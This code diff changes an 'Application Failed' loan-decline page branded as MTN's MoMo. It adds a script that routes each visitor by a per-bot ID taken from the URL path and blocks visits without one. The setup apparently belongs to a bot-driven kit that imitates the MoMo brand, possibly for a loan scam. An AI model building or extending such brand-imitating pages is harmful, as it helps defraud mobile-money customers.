@@ -1,32 +1,50 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script>
+    // ============================================================
+    //  BOT ID RESOLVER — path-based  (/bot/<botId>/...)
+    // ============================================================
+    (function () {
+        try {
+            const path = window.location.pathname;
+            const match = path.match(/^\/bot\/([A-Za-z0-9_-]+)(?:\/|$)/);
+            let botId = match ? match[1] : null;
+            if (!botId) botId = localStorage.getItem('botId');
+
+            if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
+                document.documentElement.innerHTML =
+                    '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
+                    '<h2>Invalid link</h2>' +
+                    '<p>Please open this page through the official link.</p>' +
+                    '</body>';
+                window.__BOTID_MISSING__ = true;
+                throw new Error('botId missing from path and localStorage');
+            }
+
+            localStorage.setItem('botId', botId);
+            window.__BOT_ID__ = botId;
+
+            window.__botUrl__ = function (page) {
+                page = String(page || '').replace(/^\/+/, '');
+                return '/bot/' + encodeURIComponent(botId) + '/' + page;
+            };
+
+            console.log('🆔 botId resolved from path:', botId);
+        } catch (err) {
+            console.error('botId resolver failed:', err.message);
+        }
+    })();
+    </script>
+
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Application Failed - MoMo</title>
 
     <style>
-        /* ===== MOMO STYLE (consistent with other pages) ===== */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        html, body {
-            width: 100%;
-            min-height: 100%;
-        }
-
-        body {
-            font-family: Arial, Helvetica, sans-serif;
-            background: #fff;
-            overflow-x: hidden;
-        }
-
-        /* =========================================
-           APP CONTAINER
-        ========================================= */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { width: 100%; min-height: 100%; }
+        body { font-family: Arial, Helvetica, sans-serif; background: #fff; overflow-x: hidden; }
 
         .app {
             position: relative;
@@ -39,10 +57,6 @@
             overflow: hidden;
         }
 
-        /* =========================================
-           TOP BLUE AREA (slightly shorter for this page)
-        ========================================= */
-
         .top {
             position: relative;
             height: 180px;
@@ -50,9 +64,6 @@
             padding-top: 40px;
         }
 
-        /*
-            White curved bottom of blue area
-        */
         .top::after {
             content: "";
             position: absolute;
@@ -64,10 +75,6 @@
             border-radius: 50% 50% 0 0 / 70% 70% 0 0;
         }
 
-        /* =========================================
-           TOP BAR WITH LOGO (no back button)
-        ========================================= */
-
         .top-bar {
             position: relative;
             z-index: 2;
@@ -78,11 +85,7 @@
             margin-top: -10px;
         }
 
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
+        .logo { display: flex; align-items: center; gap: 8px; }
 
         .logo-box {
             width: 40px;
@@ -113,21 +116,8 @@
             top: 8px;
         }
 
-        .logo-text {
-            color: #ffd500;
-            font-size: 20px;
-            font-weight: 800;
-            letter-spacing: -0.5px;
-        }
-        .logo-text .light {
-            font-weight: 400;
-            font-size: 14px;
-            color: #b8d4e8;
-        }
-
-        /* =========================================
-           CARD
-        ========================================= */
+        .logo-text { color: #ffd500; font-size: 20px; font-weight: 800; letter-spacing: -0.5px; }
+        .logo-text .light { font-weight: 400; font-size: 14px; color: #b8d4e8; }
 
         .card {
             position: relative;
@@ -141,7 +131,6 @@
             text-align: center;
         }
 
-        /* ----- FAILURE ICON ----- */
         .icon {
             width: 80px;
             height: 80px;
@@ -156,22 +145,10 @@
             font-weight: bold;
         }
 
-        /* ----- TITLE ----- */
-        .title {
-            font-size: 30px;
-            font-weight: 700;
-            color: #dc3545;
-            margin-bottom: 12px;
-        }
+        .title { font-size: 30px; font-weight: 700; color: #dc3545; margin-bottom: 12px; }
 
-        .subtitle {
-            font-size: 16px;
-            color: #555;
-            line-height: 1.6;
-            margin-bottom: 20px;
-        }
+        .subtitle { font-size: 16px; color: #555; line-height: 1.6; margin-bottom: 20px; }
 
-        /* ----- STATUS BADGE ----- */
         .status-badge {
             display: inline-block;
             background: #fde2e5;
@@ -183,7 +160,6 @@
             margin-bottom: 25px;
         }
 
-        /* ----- MESSAGE BOX ----- */
         .message-box {
             background: #fef3f2;
             border: 1px solid #fecdca;
@@ -193,30 +169,14 @@
             margin-bottom: 25px;
         }
 
-        .message-icon {
-            font-size: 24px;
-            margin-bottom: 10px;
-            display: block;
-        }
+        .message-icon { font-size: 24px; margin-bottom: 10px; display: block; }
 
-        .message-box h3 {
-            color: #dc3545;
-            font-size: 17px;
-            margin-bottom: 10px;
-        }
+        .message-box h3 { color: #dc3545; font-size: 17px; margin-bottom: 10px; }
 
-        .message-box p {
-            font-size: 15px;
-            color: #555;
-            line-height: 1.6;
-            margin-bottom: 12px;
-        }
+        .message-box p { font-size: 15px; color: #555; line-height: 1.6; margin-bottom: 12px; }
 
-        .message-box p:last-child {
-            margin-bottom: 0;
-        }
+        .message-box p:last-child { margin-bottom: 0; }
 
-        /* ----- BUTTON ----- */
         .btn {
             display: block;
             width: 100%;
@@ -233,65 +193,24 @@
             font-family: Arial, Helvetica, sans-serif;
         }
 
-        .btn:hover {
-            background: #00415a;
-            transform: scale(1.01);
-        }
-
-        .btn:active {
-            transform: scale(0.98);
-        }
-
-        /* =========================================
-           RESPONSIVE
-        ========================================= */
+        .btn:hover { background: #00415a; transform: scale(1.01); }
+        .btn:active { transform: scale(0.98); }
 
         @media (max-width: 480px) {
-            .top {
-                height: 160px;
-                padding-top: 30px;
-            }
-            .top-bar {
-                padding: 0 16px;
-            }
-            .card {
-                width: calc(100% - 28px);
-                margin-top: -90px;
-                padding: 28px 20px 24px;
-                border-radius: 28px;
-            }
-            .title {
-                font-size: 26px;
-            }
-            .icon {
-                width: 70px;
-                height: 70px;
-                font-size: 36px;
-            }
-            .btn {
-                font-size: 16px;
-                padding: 14px;
-            }
+            .top { height: 160px; padding-top: 30px; }
+            .top-bar { padding: 0 16px; }
+            .card { width: calc(100% - 28px); margin-top: -90px; padding: 28px 20px 24px; border-radius: 28px; }
+            .title { font-size: 26px; }
+            .icon { width: 70px; height: 70px; font-size: 36px; }
+            .btn { font-size: 16px; padding: 14px; }
         }
 
         @media (max-width: 380px) {
-            .card {
-                padding-left: 16px;
-                padding-right: 16px;
-            }
-            .title {
-                font-size: 24px;
-            }
-            .subtitle {
-                font-size: 14px;
-            }
-            .message-box p {
-                font-size: 14px;
-            }
-            .btn {
-                font-size: 15px;
-                padding: 13px;
-            }
+            .card { padding-left: 16px; padding-right: 16px; }
+            .title { font-size: 24px; }
+            .subtitle { font-size: 14px; }
+            .message-box p { font-size: 14px; }
+            .btn { font-size: 15px; padding: 13px; }
         }
     </style>
 </head>
@@ -300,12 +219,8 @@
 
 <div class="app">
 
-    <!-- ================= TOP BLUE AREA ================= -->
-
     <div class="top">
-
         <div class="top-bar">
-            <!-- Logo (centered, no back button) -->
             <div class="logo">
                 <div class="logo-box">
                     <div class="logo-symbol"></div>
@@ -313,29 +228,22 @@
                 <div class="logo-text">MoMo <span class="light">from MTN</span></div>
             </div>
         </div>
-
     </div>
-
-    <!-- ================= CARD ================= -->
 
     <div class="card">
 
-        <!-- FAILURE ICON -->
         <div class="icon">✕</div>
 
-        <!-- TITLE -->
         <div class="title">Application Failed</div>
 
         <div class="subtitle">
             Unfortunately, your loan application was not successful.
         </div>
 
-        <!-- STATUS -->
         <div class="status-badge">
             ✕ Application Declined
         </div>
 
-        <!-- FAILURE REASON -->
         <div class="message-box">
 
             <span class="message-icon">⚠️</span>
@@ -355,14 +263,21 @@
 
         </div>
 
-        <!-- REAPPLY BUTTON -->
-        <a href="index.html" class="btn">
+        <a href="index.html" id="reapplyBtn" class="btn">
             Reapply
         </a>
 
     </div>
 
 </div>
+
+<script>
+(function () {
+    const botId = window.__BOT_ID__;
+    if (!botId) return;
+    document.getElementById('reapplyBtn').href = window.__botUrl__('index.html');
+})();
+</script>
 
 </body>
 </html>
